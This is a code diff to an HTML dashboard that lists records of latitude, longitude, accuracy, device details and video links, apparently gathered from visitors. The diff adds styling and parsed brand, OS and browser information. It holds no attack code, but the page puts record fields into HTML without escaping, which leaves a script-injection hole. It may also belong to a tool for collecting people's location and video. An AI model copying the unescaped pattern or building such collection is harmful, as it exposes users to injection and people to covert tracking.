@@ -74,6 +74,15 @@
     button.delete:hover {
       background: #b52a37;
     }
+    .ua-details {
+      text-align: left;
+      font-size: 13px;
+      line-height: 1.4;
+    }
+    .ua-details small {
+      color: gray;
+      font-size: 11px;
+    }
   </style>
 </head>
 <body>
@@ -91,7 +100,7 @@
         <th>Latitude</th>
         <th>Longitude</th>
         <th>Accuracy</th>
-        <th>User Agent</th>
+        <th>User and Device Info</th>
         <th>Video</th>
         <th colspan="2">Actions</th>
       </tr>
@@ -138,7 +147,12 @@
             <td>${data.latitude || "-"}</td>
             <td>${data.longitude || "-"}</td>
             <td>${data.accuracy || "-"}</td>
-            <td>${data.userAgent || "-"}</td>
+            <td class="ua-details">
+              <b>${data.brand || "Unknown"} ${data.device || ""}</b><br>
+              ${data.os || "Unknown OS"}<br>
+              ${data.browser || "Unknown Browser"}<br>
+              <small>${data.userAgent || "-"}</small>
+            </td>
             <td><a href="${data.videoUrl}" target="_blank">🎬 Video</a></td>
             <td>
               <button class="view" onclick="viewLocation(${data.latitude}, ${data.longitude})">
